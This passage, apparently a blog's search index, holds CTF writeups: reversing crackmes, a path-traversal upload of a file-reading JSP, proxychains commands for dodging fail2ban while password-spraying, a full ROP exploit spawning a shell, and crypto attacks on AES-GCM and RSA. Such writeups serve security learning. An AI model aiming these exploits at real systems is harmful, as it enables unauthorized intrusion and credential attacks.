Flag: FDVDRRNKRDYG ","date":"Jan 11, 2022","objectID":"/posts/gcc-3.0-ctf-2022/:4:0","tags":["Writeup","GCC CTF","jsp","web","pwn","android","short-pwn","rop","got overwrite","2022"],"title":"GCC 3.0 CTF 2022","uri":"/posts/gcc-3.0-ctf-2022/"},{"categories":null,"content":"License Key Level 4 After reading the disassembly code, we know that the serial char comparison happens at this address 40752d: 44 38 2c 18 cmp BYTE PTR [rax+rbx*1],r13b With the help of GDB, we can simply set breakpoints on it, and retrieve the r13 value. We got our serial key after retrieving the r13 value 12 times. Flag: GEIJBLDJDECA ","date":"Jan 11, 2022","objectID":"/posts/gcc-3.0-ctf-2022/:5:0","tags":["Writeup","GCC CTF","jsp","web","pwn","android","short-pwn","rop","got overwrite","2022"],"title":"GCC 3.0 CTF 2022","uri":"/posts/gcc-3.0-ctf-2022/"},{"categories":null,"content":"Crack me Android I got an apk file, and I try to decompile it with the help of JDK. After reading the result I found the login code in the LoginViewModel. public void login(String str) { if (checkHooking()) { this.loginResult.setValue(new LoginResult(Integer.valueOf((int) R.string.must_not_hook))); return; } try { int[] checkPw = checkPw(getCode(str)); if (checkPw.length \u003e 0) { this.loginResult.setValue(new LoginResult(new LoggedInUser(getStringFromCode(checkPw), \"Well done you did it.\"))); } else { this.loginResult.setValue(new LoginResult(Integer.valueOf((int) R.string.login_failed))); } } catch (Exception unused) { this.loginResult.setValue(new LoginResult(Integer.valueOf((int) R.string.error_logging_in))); } } protected static int[] x0 = {121, 134, 239, 213, 16, 28, 184, 101, 150, 60, 170, 49, 159, 189, 241, 146, 141, 22, 205, 223, 218, 210, 99, 219, 34, 84, 156, 237, 26, 94, 178, 230, 27, 180, 72, 32, 102, 192, 178, 234, 228, 38, 37, 142, 242, 142, 133, 159, 142, 33}; protected int[] getCode(String str) { byte[] bytes = str.getBytes(); int[] iArr = new int[str.length()]; for (int i = 0; i \u003c str.length(); i++) { iArr[i] = bytes[i] ^ x0[i]; } return iArr; } Basically, what it do is our password will be xor-ed with the x0 var, and then the result will be passed to native method called checkPw I extract the native lib so file, and open it on Ghidra. With the help of JNIAnalyzer, I could deduce the password checker that was used in the checkPw method. jintArray Java_org_bfe_crackmenative_ui_LoginViewModel_checkPw (JNIEnv *env,jobject thiz,jintArray password) { bool bVar1; bool bVar2; jintArray new_arr; jsize password_length; FILE *__stream; char *pcVar3; jint *curr_char_pass; char expected_char; long idx; jintArray new_arr5; long in_FS_OFFSET; char local_1038 [4096]; long local_38; local_38 = *(long *)(in_FS_OFFSET + 0x28); __android_log_write(4,\"Native Check\",\"Checking password ...\"); new_arr = (*(*env)-\u003eNewIntArray)(env,0); password_length = (*(*env)-\u003eGetArrayLength)(env,password); new_arr5 = new_arr; if ((int)password_length == 27) { __stream = fopen(\"/proc/self/maps\",\"r\"); do { pcVar3 = fgets(local_1038,0x1000,__stream); if (pcVar3 == (char *)0x0) { bVar1 = false; bVar2 = bVar1; if (__stream == (FILE *)0x0) goto LAB_001009f9; goto LAB_001009f1; } pcVar3 = strstr(local_1038,\"Xposed\"); bVar1 = true; } while ((pcVar3 == (char *)0x0) \u0026\u0026 (pcVar3 = strstr(local_1038,\"frida\"), pcVar3 == (char *)0x0) ); bVar2 = true; if (__stream != (FILE *)0x0) { LAB_001009f1: bVar1 = bVar2; fclose(__stream); } LAB_001009f9: if (!bVar1) { idx = 0; curr_char_pass = (*(*env)-\u003eGetIntArrayElements)(env,password,(jboolean *)0x0); for (_expected_char = \u0026DAT_00100c8c; ((new_arr5 = new_arr, ((\u0026DAT_00100b20)[idx] ^ *(uint *)((long)curr_char_pass + idx * 4) ^ *_expected_char) == (\u0026DAT_00100cc0)[idx] \u0026\u0026 (new_arr5 = password, idx != 26)) \u0026\u0026 (new_arr5 = new_arr, ((\u0026DAT_00100b24)[idx] ^ *(uint *)((long)curr_char_pass + idx * 4 + 4) ^ _expected_char[-1] ) == (\u0026DAT_00100cc4)[idx])); _expected_char = _expected_char + -2) { idx = idx + 2; } } } if (*(long *)(in_FS_OFFSET + 0x28) != local_38) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return new_arr5; } Reading the code, we know that the password length is 27, and the native lib have three different keys in the native (key_a which is DAT_00100b20, key_b which is DAT_00100c8c and key_c which is DAT_00100cc0 ). What it do is input[i] ^ key_a[i] ^ key_b[-i] = key_c[i] And merging with the Login logic, the final operation would be password[i] ^ x0[i] ^ key_a[i] ^ key_b[-i] = key_c[i] So to generate the password (which is the flag), we just need to do: password[i] = x0[i] ^ key_a[i] ^ key_b[-i] ^ key_c[i] Full code: key_a = b'\\xd0\\x45\\x28\\x76\\x6f\\xf3\\x5a\\xf4\\xc7\\xce\\xfb\\xc3\\x7f\\x48\\xce\\x3c\\x3a\\x0b\\xf1\\x53\\xb1\\x4b\\xb9\\x5e\\xa2\\x65\\x77' key_b = b'\\x4c\\x7b\\x73\\x6f\\x72\\x72\\x79\\x2e\\x74\\x68\\x69\\x73\\x2e\\x69\\x73\\x2e\\x4e\\x4f\\x54\\x2e\\x74\\x68\\x65\\x2e\\x66\\x6c\\x61' key_c = b'\\x80\\xe3\\xda\\xc7\\x2e\\xf1\\xa2\\x91\\x6b","date":"Jan 11, 2022","objectID":"/posts/gcc-3.0-ctf-2022/:6:0","tags":["Writeup","GCC CTF","jsp","web","pwn","android","short-pwn","rop","got overwrite","2022"],"title":"GCC 3.0 CTF 2022","uri":"/posts/gcc-3.0-ctf-2022/"},{"categories":null,"content":"PLUpload I try to check /examples folder, and found out that this uses Apache Tomcat. After playing it for a while (especially on the upload feature), I notice that the upload feature doesn‚Äôt sanitize ../, which mean we can freely upload the file to any directories. Also inside the examples folder there are a lot of jsp file example that got executed. My solution is to upload a jsp file to the examples folder path (/examples/jsp/jsp2/el) where the jsp file will open /var/gold.txt file contents. Below is the jsp file \u003c%@page import=\"java.io.FileInputStream\"%\u003e \u003c%@page import=\"java.io.File\"%\u003e \u003c%@page import=\"java.io.InputStreamReader\"%\u003e \u003c%@page import=\"java.net.URL\"%\u003e \u003c%@page import=\"java.io.FileReader\"%\u003e \u003c%@page import=\"java.io.BufferedReader\"%\u003e \u003c%@page contentType=\"text/html\" pageEncoding=\"UTF-8\"%\u003e \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"\u003e \u003ctitle\u003eRead Text\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003c% String txtFilePath = \"/var/gold.txt\"; BufferedReader reader = new BufferedReader(new FileReader(txtFilePath)); StringBuilder sb = new StringBuilder(); String line; while((line = reader.readLine())!= null){ sb.append(line+\"\\n\"); } out.println(sb.toString()); %\u003e \u003c/body\u003e \u003c/html\u003e Below is the upload request that I use to upload the jsp file to ../../examples/jsp/jsp2/el/cho.jsp POST //upload HTTP/1.1 Host: e95ca4f3-a493-4192-802e-7af99f4262bc.idocker.vuln.land User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------34999802810414628822789368601 Content-Length: 1479 Origin: https://e95ca4f3-a493-4192-802e-7af99f4262bc.idocker.vuln.land Connection: close Referer: https://e95ca4f3-a493-4192-802e-7af99f4262bc.idocker.vuln.land/ Cookie: JSESSIONID=6E2119D7A2763AC0C88B4888A10C0E8B Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin -----------------------------34999802810414628822789368601 Content-Disposition: form-data; name=\"name\" ../../examples/jsp/jsp2/el/cho.jsp -----------------------------34999802810414628822789368601 Content-Disposition: form-data; name=\"chunk\" 0 -----------------------------34999802810414628822789368601 Content-Disposition: form-data; name=\"chunks\" 1 -----------------------------34999802810414628822789368601 Content-Disposition: form-data; name=\"file\"; filename=\"cho.jsp\" Content-Type: application/octet-stream \u003c%@page import=\"java.io.FileInputStream\"%\u003e \u003c%@page import=\"java.io.File\"%\u003e \u003c%@page import=\"java.io.InputStreamReader\"%\u003e \u003c%@page import=\"java.net.URL\"%\u003e \u003c%@page import=\"java.io.FileReader\"%\u003e \u003c%@page import=\"java.io.BufferedReader\"%\u003e \u003c%@page contentType=\"text/html\" pageEncoding=\"UTF-8\"%\u003e \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"\u003e \u003ctitle\u003eRead Text\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003c% String txtFilePath = \"/var/gold.txt\"; BufferedReader reader = new BufferedReader(new FileReader(txtFilePath)); StringBuilder sb = new StringBuilder(); String line; while((line = reader.readLine())!= null){ sb.append(line+\"\\n\"); } out.println(sb.toString()); %\u003e \u003c/body\u003e \u003c/html\u003e -----------------------------34999802810414628822789368601-- After upload it, we can simply open the file Flag: New is always better. - Barney Stinson Misc ","date":"Jan 11, 2022","objectID":"/posts/gcc-3.0-ctf-2022/:7:0","tags":["Writeup","GCC CTF","jsp","web","pwn","android","short-pwn","rop","got overwrite","2022"],"title":"GCC 3.0 CTF 2022","uri":"/posts/gcc-3.0-ctf-2022/"},{"categories":null,"content":"CTF Spray Attack SSH With the help of proxychains, we can dynamically change our ip to bypass the fail2ban. Command that I used: proxychains sshpass -p 93370760 ssh -o StrictHostKeyChecking=no user_100283@pwspray.vm.vuln.land -p 22 ","date":"Jan 11, 2022","objectID":"/posts/gcc-3.0-ctf-2022/:8:0","tags":["Writeup","GCC CTF","jsp","web","pwn","android","short-pwn","rop","got overwrite","2022"],"title":"GCC 3.0 CTF 2022","uri":"/posts/gcc-3.0-ctf-2022/"},{"categories":null,"content":"CTF Spray Attack HTTP With the help of proxychains, we can dynamically change our ip to bypass the fail2ban. Command that I used: proxychains curl --user user_140244:6ed42dd7 http://pwspray.vm.vuln.land -v Pwn ","date":"Jan 11, 2022","objectID":"/posts/gcc-3.0-ctf-2022/:9:0","tags":["Writeup","GCC CTF","jsp","web","pwn","android","short-pwn","rop","got overwrite","2022"],"title":"GCC 3.0 CTF 2022","uri":"/posts/gcc-3.0-ctf-2022/"},{"categories":null,"content":"CrySYS We were given a binary that is pretty short #include \u003cstdio.h\u003e #include \u003cunistd.h\u003e //gcc -o challenge -no-pie -fno-stack-protector challenges.c //LD_PRELOAD=./libc-2.27.so ./ld-2.27.so ./challenge int not_vulnerable(){ char buf[80]; return read(0, buf, 0x1000); } int main(){ not_vulnerable(); return 0; } There is a buffer overflow vulnerability. Because the plt only contains read, we need to do partial overwrite (1 byte) to the read_got value so that we can execute syscall. The idea to gain the shell is: Overwrite RIP to read_plt Overwrite read_got to syscall with read (1 last byte) Rax = 1, If we call read_plt (which now is syscall), we can leak the got address and retrieve the libc base address Set rax to 0 Syscall read again to load our second payload into .bss (Second payload will execute system(\"/bin/sh\")) Set rsp to the .bss Pop ‚Äú/bin/sh‚Äù to rdi Ret to system Below is my full payload from pwn import * context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") # Chosen BSS bss = 0x00601030+0x400 # readelf -s libc-2.27.so | grep \"read\" = 0x0000000000110070 # I choose to redirect it to directly syscall inside read (read+15) read_offset = 0x000000000011007f read_plt = 0x00000000004003f0 read_got = 0x601018 syscall = read_plt # We will overwrite read_got to syscall, so basically syscall = read_plt # ROPGadget result pop_rdi = 0x0000000000400583 # pop rdi ; ret pop_rsi_r15 = 0x0000000000400581 # pop rsi ; pop r15 ; ret pop_rsp = 0x000000000040057d # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret mov_eax_0_pop_rbp = 0x0000000000400515 # mov eax, 0 ; pop rbp ; ret ret_address = 0x00000000004003de # ret libc = ELF('./libc-2.27.so') r = process('./crySYS_patched') # Load stage 2 rop payload = b'a'*80 payload += p64(bss) payload += p64(pop_rsi_r15) + p64(read_got) + p64(0) payload += p64(read_plt) # Overwrite 1 bytes, rax == 1 payload += p64(pop_rdi) + p64(1) payload += p64(syscall) # rax == 1 == write(1, got_addr) payload += p64(mov_eax_0_pop_rbp) + p64(bss+72) # Set rax to 0 payload += p64(pop_rdi) + p64(0) payload += p64(pop_rsi_r15) + p64(bss) + p64(0) payload += p64(syscall) # read(0, bss) payload += p64(pop_rsp) + p64(bss) # Set rsp to bss sleep(1) r.sendline(payload) log.info('Payload sent...') sleep(1) # Overwrite 1 byte of read_got by syscall inside read r.send(b'\\x7f') log.info('Overwrite read got...') sleep(1) # After leaking the address, call system() leak_syscall_address = u64(r.recvn(8)) libc.address = leak_syscall_address - read_offset log.info(f'Leaked syscall address: {hex(leak_syscall_address)}') log.info(f'Leaked libc address: {hex(libc.address)}') # Craft payload to call system('/bin/sh') bin_sh_string_addr = next(libc.search(b'/bin/sh')) payload_3 = p64(0) + p64(0) + p64(0) payload_3 += p64(pop_rdi) + p64(bin_sh_string_addr) payload_3 += p64(ret_address) # https://stackoverflow.com/questions/60729616/segfault-in-ret2libc-attack-but-not-hardcoded-system-call payload_3 += p64(libc.symbols['system']) + p64(0) # Call system sleep(1) r.send(payload_3) log.info('Call system(\"/bin/sh\")...') r.interactive() Flag: HL{PPPwned-7165-4679-8c39-cf7633bdf81b} Crypto ","date":"Jan 11, 2022","objectID":"/posts/gcc-3.0-ctf-2022/:10:0","tags":["Writeup","GCC CTF","jsp","web","pwn","android","short-pwn","rop","got overwrite","2022"],"title":"GCC 3.0 CTF 2022","uri":"/posts/gcc-3.0-ctf-2022/"},{"categories":null,"content":"IDBased1 After checking with the given ciphertexts consist of encrypted message of ‚ÄòThis is the test message number x‚Äô, there is a collision between the ciphertexts CEO and the test ciphertexts CEO ciphertexts: (48589388807824569428904895217595930284742776679758376879158603177028397294637208100498204082285088554469912630884992811058648356701793719253927209526856391255958203708765937470965113379063164783112790458526467722720510441287344375068385945897745788289000831021749963218399056946672933810712728531356131069075, 91666678461349391408393081333148703690518650210973716238555488161769616574067974692422855852226270111041696008098903109570179474889001701370982766256913315456108459222753446063832634368831212498249621216114532831173942748910271298860729376114971648924546503909862899046327681305300267651777702160513672803461), 4LXZeMmDX9bXWxTmFF4oimniK0Sq39kURG4v One of the test ciphertexts: (48589388807824569428904895217595930284742776679758376879158603177028397294637208100498204082285088554469912630884992811058648356701793719253927209526856391255958203708765937470965113379063164783112790458526467722720510441287344375068385945897745788289000831021749963218399056946672933810712728531356131069075, 91666678461349391408393081333148703690518650210973716238555488161769616574067974692422855852226270111041696008098903109570179474889001701370982766256913315456108459222753446063832634368831212498249621216114532831173942748910271298860729376114971648924546503909862899046327681305300267651777702160513672803461), 7ZP/X9jSV7SXdzPyJHlvuhu7AHOW8/A0UTUnlUL+URbc BasicIdent ciphertext is like below: v = m xor H2(gID**r) Because the $rP$ value is the same, we could know that the $H2(g_{ID}^r)$ value of the ceo and the test cipher texts have the same value, which mean ceo_v = b64decode('4LXZeMmDX9bXWxTmFF4oimniK0Sq39kURG4v') test_v = b64decode('7ZP/X9jSV7SXdzPyJHlvuhu7AHOW8/A0UTUnlUL+URbc') ceo_msg = test_v^b'This is the message number'^ceo_v Full Script: from pwn import * import base64 ceo_v = base64.b64decode('4LXZeMmDX9bXWxTmFF4oimniK0Sq39kURG4v') flag_len = len(ceo_v) test_v = base64.b64decode('7ZP/X9jSV7SXdzPyJHlvuhu7AHOW8/A0UTUnlUL+URbc') test_msg = b'This is the test message number' flag = xor(xor(test_v[:flag_len], test_msg[:flag_len]), ceo_v) print(f'Flag: {flag.decode()}') We successfully retrieve the flag Flag: YNOT18{B4DB4DB4DR4NDOMNE55} Social Media Follow me on twitter ","date":"Jan 11, 2022","objectID":"/posts/gcc-3.0-ctf-2022/:11:0","tags":["Writeup","GCC CTF","jsp","web","pwn","android","short-pwn","rop","got overwrite","2022"],"title":"GCC 3.0 CTF 2022","uri":"/posts/gcc-3.0-ctf-2022/"},{"categories":null,"content":"This CTF marked the start of my journey on preparing myself to convert my role from Software Engineer to Security Engineer for the next 4 years. I‚Äôve taken a break from CTF since I graduated from my college. On this CTF, I managed to solve 2 Crypto Challenge Alkoloid Stream (134 pts) GoodHash (218 pts) Today, I will explain my solution on solving the GoodHash. Crypto ","date":"Oct 11, 2021","objectID":"/posts/pbctf-2021/:0:0","tags":["Writeup","PBCTF","AES","AES-GCM","crypto","2021"],"title":"PBCTF 2021","uri":"/posts/pbctf-2021/"},{"categories":null,"content":"GoodHash (218 pts) I think I made a good hash function based on AES. Could you test this? nc good-hash.chal.perfect.blue 1337 Author: rbtree file: main.py ","date":"Oct 11, 2021","objectID":"/posts/pbctf-2021/:1:0","tags":["Writeup","PBCTF","AES","AES-GCM","crypto","2021"],"title":"PBCTF 2021","uri":"/posts/pbctf-2021/"},{"categories":null,"content":"Source Code #!/usr/bin/env python3 from Crypto.Cipher import AES from Crypto.Util.number import * from flag import flag import json import os import string ACCEPTABLE = string.ascii_letters + string.digits + string.punctuation + \" \" class GoodHash: def __init__(self, v=b\"\"): self.key = b\"goodhashGOODHASH\" self.buf = v def update(self, v): self.buf += v def digest(self): cipher = AES.new(self.key, AES.MODE_GCM, nonce=self.buf) enc, tag = cipher.encrypt_and_digest(b\"\\0\" * 32) return enc + tag def hexdigest(self): return self.digest().hex() if __name__ == \"__main__\": token = json.dumps({\"token\": os.urandom(16).hex(), \"admin\": False}) token_hash = GoodHash(token.encode()).hexdigest() print(f\"Body: {token}\") print(f\"Hash: {token_hash}\") inp = input(\"\u003e \") if len(inp) \u003e 64 or any(v not in ACCEPTABLE for v in inp): print(\"Invalid input :(\") exit(0) inp_hash = GoodHash(inp.encode()).hexdigest() if token_hash == inp_hash: try: token = json.loads(inp) if token[\"admin\"] == True: print(\"Wow, how did you find a collision?\") print(f\"Here's the flag: {flag}\") else: print(\"Nice try.\") print(\"Now you need to set the admin value to True\") except: print(\"Invalid input :(\") else: print(\"Invalid input :(\") ","date":"Oct 11, 2021","objectID":"/posts/pbctf-2021/:1:1","tags":["Writeup","PBCTF","AES","AES-GCM","crypto","2021"],"title":"PBCTF 2021","uri":"/posts/pbctf-2021/"},{"categories":null,"content":"Analysis General key points I really love this challenge, because I learn a lot of new things during taking my time to solve this challenge. After I read the source code, some key notes that we could infer: It use AES-GCM It give us the encryption key goodhashGOODHASH It require us to find a hash collision with some constraints: The message should be in json format The message should only contains characters from the ACCEPTABLE variable The message will need to contain \"admin\": true if we want to get the flag Our input is actually being used as the AES-GCM nonce, not as the plaintext. If you read the source code, the plaintext message always \\0*32 Check digest method After reading many articles in the internet about AES-GCM, below is the encryption scheme. Further analysis: If you notice, because our plaintext is always 0, we can safely ignore the plaintext and just focus on the nonce (because if you see the image pt1^Ek(Counter 1) = Ek(Counter 1) because of null plaintext) Turns out, the recommended nonce length for AES-GCM is 96 bits (12 bytes), so that the first block of encryption will be iv||counter, where iv is 12 bytes and counter is 4 bytes. If the nonce length is not 96 bit (whether shorter or longer), the nonce will be hashed by using the GHASH algorithm. Reading the source code, we know that the targeted input ('{\"token\":\"xxx\", \"admin\": false}') and our input length will always be longer than 12 bytes, which mean our nonce will be always hashed by GHASH method. (This is important note) GHASH Explained For detailed info, you can read wiki, but I‚Äôll try to explain it. Defined as GHASH(H,A,C), it requires 3 inputs: H: The secret key, calculated by Ek(‚Äô\\0‚Äô*16) A: Associated data C: Message that we want to authenticate GHASH Pseudocode: ---------------------------------------------- x = bytes(16) # Initialize x with 16 bytes of 0 padded_a = pad(a) # Append extra '\\x00' until the size is divisible by 16 padded_c = pad(c) # Append extra '\\x00' until the size is divisible by 16 for i in range(0,len(padded_a),16): x = xor(x, padded_a[i:i+16])‚Ä¢H for i in range(0,len(padded_c),16): x = xor(x, padded_c[i:i+16])‚Ä¢H # Notes: # conv is illustration function that will convert integer to 16 bytes representation # Example: # 1 -\u003e b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01' # 8 -\u003e b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08' # 11 -\u003e b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0b' return xor(x, conv(len(padded_a)+len(padded_c)))‚Ä¢H Notes: The multiplication of xor(x1,x2)‚Ä¢H is happen on $GF(2^{128})$ defined by polynomial $$Poly=x^{128}+x^7+x^2+x+1$$ Vulnerability So, if you read the source code, you can see that: Our input is limited to 64 Target hash is created from nonce {\"token: \"xxxxxxxxxxxxxxxx\", \"admin\": false}, which length is 61. I‚Äôve explained above that if the nonce is not equal to 92 bit, by default AES-GCM will GHASH the nonce. Let‚Äôs try to simulate it: Let say that the nonce is {\"token: \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\", \"admin\": false}. Length is 61 AES-GCM will call GHASH(H,bytes(),nonce) (without any associated data) GHASH will pad the nonce and split it per 16 bytes. block_1 = '{\"token\": \"xxxxx' block_2 = 'xxxxxxxxxxxxxxxx' block_3 = 'xxxxxxxxxxx\", \"a' block_4 = 'dmin\": false}\\x00\\x00\\x00' GHASH will initialize x with 16 bytes of \\x00. final_x will be used as the AES-GCM first block input (substitute of iv||counter) x0 = '\\x00'*16 x1 = xor(x0, block_1)‚Ä¢H x2 = xor(x1, block_2)‚Ä¢H x3 = xor(x2, block_3)‚Ä¢H x4 = xor(x3, block_4)‚Ä¢H final_x = xor(x4, ('\\x00'*15 + '\\x3d'))‚Ä¢H # \\x3d is nonce length representation in bytes, \\x3d == 61 After this, the AES-GCM will start and give the encrypted+tag The vulnerability of this code is we know the secret key H. Because we know the secret, we can do preimage attack. Consider the below equation, which is how GHASH works: $$x_i=(x_{i‚àí1}‚äïA_i)‚ãÖH$$ where A is the input that we control. If we know state $x_i$, and we want the next state $x_{i+1}$ equals to let say $P$ $$ùëÉ=x_{ùëñ+1}=(x_ùëñ‚äïA_{ùëñ+1})‚ãÖùêª$$ We can get the correct $A","date":"Oct 11, 2021","objectID":"/posts/pbctf-2021/:1:2","tags":["Writeup","PBCTF","AES","AES-GCM","crypto","2021"],"title":"PBCTF 2021","uri":"/posts/pbctf-2021/"},{"categories":null,"content":"Solution So, here is my full solution. from Crypto.Util.number import * from Crypto.Cipher import AES from multiprocessing import Process import random acceptable = string.ascii_letters + string.digits + '!#$%\u0026()*+,-.:;\u003c=\u003e?@[]^_`|~ ' key = b'goodhashGOODHASH' def tobin(x, n): x = Integer(x) nbits = x.nbits() assert nbits \u003c= n return [0] * (n - nbits) + x.bits()[::-1] def frombin(v): return int(\"\".join(map(str, v)), 2 ) X = GF(2).polynomial_ring().gen() poly = X**128 + X**7 + X**2 + X**1 + 1 F = GF(2**128, name='a', modulus=poly) def toF(x): # Little endian, so need bit reverse x = frombin(tobin(x, 128)[::-1]) return F.fetch_int(x) def fromF(x): # Little endian, so need bit reverse x = x.integer_representation() x = frombin(tobin(x, 128)[::-1]) return x def field_mult(a, b): return fromF(toF(a) * toF(b)) def rand_str(): global acceptable n = 16 return ''.join(random.choice(acceptable) for _ in range(n)).encode() # Calculate H and H^-1 ex = False Ek = AES.new(key, AES.MODE_ECB) hkey = Ek.encrypt(b'\\x00'*(16)) h = bytes_to_long(hkey) inverse_h = fromF(toF(h)^-1) target_json = b'{\"token\": \"a617eb720dd41c256119c8b8e64d50d1\", \"admin\": false}' padded_target_json = target_json + b'\\x00'*((16-len(target_json)%16)%16) target_x = [0] # initialize with 0 for i in range(0, len(padded_target_json), 16): block = padded_target_json[i:i+16] x = field_mult(target_x[-1]^^bytes_to_long(block), h) target_x.append(x) def solve(): global target_x global h global inverse_h global target_json # Craft payload new_x = [0] new_block1 = b'{\"admin\":true, \"' new_x.append(field_mult(new_x[-1]^^bytes_to_long(new_block1), h)) while True: new_block2 = rand_str() new_x2 = field_mult(new_x[-1]^^bytes_to_long(new_block2), h) new_block3 = long_to_bytes(field_mult(target_x[3], inverse_h)^^new_x2) # print new_block1+new_block2+new_block3+target_json[48:], target_x[3] == field_mult(new_x2^^bytes_to_long(new_block3), h) if not any(v not in acceptable.encode() for v in new_block3): payload = new_block1+new_block2+new_block3+target_json[48:] print('[+] Payload:', payload) exit() def finds(): global ex while True: if ex: break solve() if __name__ == '__main__': proc = [] for _ in range(6): p = Process(target=finds) p.start() proc.append(p) input() ex = True for p in proc: p.join() Running the code will give you this Putting one of the found payloads will give you the flag Flag: pbctf{GHASH_is_short_for_GoodHash_üòÇ} ","date":"Oct 11, 2021","objectID":"/posts/pbctf-2021/:1:3","tags":["Writeup","PBCTF","AES","AES-GCM","crypto","2021"],"title":"PBCTF 2021","uri":"/posts/pbctf-2021/"},{"categories":null,"content":"References StackExchange question about preimage attack on GHASH AES-GCM Implementation Wikipedia about AES-GCM MSLC Writeup about GCM (which I reuse some of their codes. Thanks) Social Media Follow me on Twitter ","date":"Oct 11, 2021","objectID":"/posts/pbctf-2021/:1:4","tags":["Writeup","PBCTF","AES","AES-GCM","crypto","2021"],"title":"PBCTF 2021","uri":"/posts/pbctf-2021/"},{"categories":null,"content":"I‚Äôm going to explain my writeup for some challenges that I have done in this year CSAW CTF. Crypto ","date":"Sep 16, 2019","objectID":"/posts/csaw-ctf-2019/:0:0","tags":["Writeup","CSAW CTF","crypto","rsa","2019"],"title":"CSAW CTF 2019","uri":"/posts/csaw-ctf-2019/"},{"categories":null,"content":"Fault Box Below is the given chall import socketserver import random import signal import time import gmpy2 from Crypto.Util.number import inverse, bytes_to_long, long_to_bytes FLAG = open('flag', 'r').read().strip() def s2n(s): return bytes_to_long(bytearray(s, 'latin-1')) def n2s(n): return long_to_bytes(n).decode('latin-1') def gen_prime(): base = random.getrandbits(1024) off = 0 while True: if gmpy2.is_prime(base + off): break off += 1 p = base + off return p, off class RSA(object): def __init__(self): pass def generate(self, p, q, e=0x10001): self.p = p self.q = q self.N = p * q self.e = e phi = (p-1) * (q-1) self.d = inverse(e, phi) def encrypt(self, p): return pow(p, self.e, self.N) def decrypt(self, c): return pow(c, self.d, self.N) # ===== FUNCTIONS FOR PERSONAL TESTS, DON'T USE THEM ===== def TEST_CRT_encrypt(self, p, fun=0): ep = inverse(self.d, self.p-1) eq = inverse(self.d, self.q-1) qinv = inverse(self.q, self.p) c1 = pow(p, ep, self.p) c2 = pow(p, eq, self.q) ^ fun h = (qinv * (c1 - c2)) % self.p c = c2 + h*self.q return c def TEST_CRT_decrypt(self, c, fun=0): dp = inverse(self.e, self.p-1) dq = inverse(self.e, self.q-1) qinv = inverse(self.q, self.p) m1 = pow(c, dp, self.p) m2 = pow(c, dq, self.q) ^ fun h = (qinv * (m1 - m2)) % self.p m = m2 + h*self.q return m def go(req): r = RSA() p, x = gen_prime() q, y = gen_prime() r.generate(p, q) fake_flag = 'fake_flag{%s}' % (('%X' % y).rjust(32, '0')) def enc_flag(): req.sendall(b'%X\\n' % r.encrypt(s2n(FLAG))) def enc_fake_flag(): req.sendall(b'%X\\n' % r.encrypt(s2n(fake_flag))) def enc_fake_flag_TEST(): req.sendall(b'%X\\n' % r.TEST_CRT_encrypt(s2n(fake_flag), x)) def enc_msg(): req.sendall(b'input the data:') p = str(req.recv(4096).strip(), 'utf-8') req.sendall(b'%X\\n' % r.encrypt(s2n(p))) menu = { '1': enc_flag, '2': enc_fake_flag, '3': enc_fake_flag_TEST, '4': enc_msg, } cnt = 2 while cnt \u003e 0: req.sendall(bytes( '====================================\\n' ' fault box\\n' '====================================\\n' '1. print encrypted flag\\n' '2. print encrypted fake flag\\n' '3. print encrypted fake flag (TEST)\\n' '4. encrypt\\n' '====================================\\n', 'utf-8')) choice = str(req.recv(2).strip(), 'utf-8') if choice not in menu: exit(1) menu[choice]() if choice == '4': continue cnt -= 1 class incoming(socketserver.BaseRequestHandler): def handle(self): signal.alarm(300) random.seed(time.time()) req = self.request while True: go(req) class ReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass socketserver.TCPServer.allow_reuse_address = True server = ReusableTCPServer((\"0.0.0.0\", 23333), incoming) server.serve_forever() When I try to connect to the service, I was greeted by this message. ==================================== fault box ==================================== 1. print encrypted flag 2. print encrypted fake flag 3. print encrypted fake flag (TEST) 4. encrypt ==================================== So basically, we need to enter our chosen menu, and the service will return the encrypted message. For menu 1, the service will return the encrypted flag (the one that we need to decrypt), menu 2 will return the encrypted fake_flag, menu 3 will return the encrypted fake_flag also, but with different method (CRT), menu 4 will ask us for an input, and they will return the encrypted message. Let‚Äôs check the problem challenge code. cnt = 2 while cnt \u003e 0: req.sendall(bytes( '====================================\\n' ' fault box\\n' '====================================\\n' '1. print encrypted flag\\n' '2. print encrypted fake flag\\n' '3. print encrypted fake flag (TEST)\\n' '4. encrypt\\n' '====================================\\n', 'utf-8')) choice = str(req.recv(2).strip(), 'utf-8') if choice not in menu: exit(1) menu[choice]() if choice == '4': continue cnt -= 1 After examining for a while, this challenge only give us the $e$ value, which is $0x10001$. Not only that, the challenge give us chance to encrypt as many message as we can using the fourth","date":"Sep 16, 2019","objectID":"/posts/csaw-ctf-2019/:1:0","tags":["Writeup","CSAW CTF","crypto","rsa","2019"],"title":"CSAW CTF 2019","uri":"/posts/csaw-ctf-2019/"},{"categories":null,"content":" Who am I? I am an Ex-SWE who is trying to find a way to move into Security fields. I‚Äôve resigned from my SWE full-time job on January 2023 to self-study everything about security. What am I doing now? I‚Äôm currently learning everything about security via CTF (I‚Äôm part of the Water Paddler team). Usually, during the weekdays, I study past CTF challenges and read a lot of security articles, books, etc. While on the weekend, I participate in the active CTFs with my CTF team. Favorite Categories Pwn and Crypto. Open to Work You can contact me via Twitter or Email if you have a good opportunity for me related to security jobs. ","date":"Jan 01, 2019","objectID":"/about/:0:0","tags":null,"title":"About Me","uri":"/about/"}]